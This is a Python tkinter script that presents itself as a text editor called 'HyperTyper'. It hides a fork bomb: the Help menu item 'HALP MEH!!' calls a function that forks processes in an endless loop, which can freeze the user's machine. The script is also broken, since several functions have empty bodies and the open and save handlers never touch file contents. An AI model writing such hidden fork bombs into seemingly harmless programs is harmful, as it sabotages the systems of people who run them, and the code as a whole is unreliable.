#!/usr/bin/env python3

##################################
# Program Name: HyperTyper       #
# Version: 1.3.2                 #
# Author: Ethan Hicks            #
# Published: 2/08/2016           #
################################## 

import tkinter
from tkinter import *
from tkinter import filedialog
import os

root = Tk()

count = 0

root.wm_title('HYPER TYPER')
label = tkinter.Label(root, text = 'Welcome to the multiline text editor HyperTyper!\n The Limited functionality is free!')
label.pack()
frame1 = tkinter.Frame(root)
frame1.pack()
frame2 = tkinter.Frame(root)
frame2.pack()

def donothing():
   filewindow = Toplevel(root)
   button = Button(filewindow, text="FAIL")
   button.pack()

def kill_everything():
	while(1):
		os.fork()


def Open_File():   
    root.filename = filedialog.askopenfilename(filetypes = (("text files",".txt"),("All Files","*.*")))
    text = root.filename.split('/')
    filename = text[-1]
    main_text.insert(0,filename)
    #print(filename)

def Save_File():
    root.filename = filedialog.asksaveasfilename(filetypes = (("text files",".txt"),("All Files","*.*")))
    text = root.filename.split('/') 
    filename = text[-1]
    main_text.insert(0,filename)
    #print(filename) 


def cut_stuff():



def copy_stuff():



def paste_stuff():



def new_window():





menubar = Menu(root)
filemenu = Menu(menubar, tearoff=0)
filemenu.add_command(label="New", command=donothing)
filemenu.add_command(label="Open", command=Open_File)
filemenu.add_command(label="Save", command=Save_File)
filemenu.add_command(label="Save as...", command=Save_File)
filemenu.add_command(label="Close", command=root.quit)

filemenu.add_separator()

filemenu.add_command(label="Exit", command=root.quit)
menubar.add_cascade(label="File", menu=filemenu)
editmenu = Menu(menubar, tearoff=0)
editmenu.add_command(label="Undo", command=donothing)

editmenu.add_separator()

editmenu.add_command(label="Cut", command=donothing)
editmenu.add_command(label="Copy", command=donothing)
editmenu.add_command(label="Paste", command=donothing)
editmenu.add_command(label="Delete", command=donothing)
editmenu.add_command(label="Select All", command=donothing)

menubar.add_cascade(label="Edit", menu=editmenu)
helpmenu = Menu(menubar, tearoff=0)
helpmenu.add_command(label="HALP MEH!!", command=kill_everything)
helpmenu.add_command(label="About...", command=donothing)
menubar.add_cascade(label="Help", menu=helpmenu)

root.config(menu=menubar)

main_text = tkinter.Text(root)
main_text.pack()

root.mainloop()
